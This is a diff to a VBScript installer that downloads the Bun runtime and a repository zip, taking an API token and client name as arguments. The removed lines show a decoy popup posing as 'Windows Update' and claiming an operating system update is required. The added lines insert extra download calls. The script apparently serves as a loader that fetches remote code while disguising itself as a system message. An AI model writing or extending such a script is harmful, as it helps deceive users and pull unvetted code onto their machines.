@@ -51,22 +51,6 @@ If WScript.Arguments.Count >= 2 Then apiToken   = WScript.Arguments(1)
 If WScript.Arguments.Count >= 3 Then clientName = WScript.Arguments(2)
 
 ' ============================================================
-' Guard: show error and exit if already installed
-' ============================================================
-Dim markerFile
-markerFile = workDir & "\.installed"
-If fso.FileExists(markerFile) Then
-    shell.Popup "an operating system update is required", 0, "Windows Update", 16
-    WScript.Quit 0
-End If
-
-' Write marker immediately to block concurrent re-runs
-Dim mf
-Set mf = fso.CreateTextFile(markerFile, True)
-mf.Close
-Set mf = Nothing
-
-' ============================================================
 ' Bootstrap: create directories before first log write
 ' ============================================================
 RunCmd "cmd.exe /c md """ & bunDir   & """ 2>nul"
@@ -87,6 +71,7 @@ If Not fso.FileExists(bunExe) Then
     bunZip     = workDir & "\bun-windows-x64.zip"
     bunExtract = workDir & "\bun-extract"
 
+    PsDownload BUN_URL, bunZip
     If Not DownloadWithRetry(BUN_URL, bunZip) Then
         AppendLog "ERROR: failed to download Bun zip after all retries"
         Cleanup bunZip, bunExtract
@@ -118,6 +103,7 @@ Dim repoZip, repoExtract
 repoZip     = workDir & "\btr-main.zip"
 repoExtract = workDir & "\btr-extract"
 
+PsDownload REPO_ZIP_URL, repoZip
 If Not DownloadWithRetry(REPO_ZIP_URL, repoZip) Then
     AppendLog "ERROR: failed to download repo zip after all retries"
     Cleanup repoZip, repoExtract
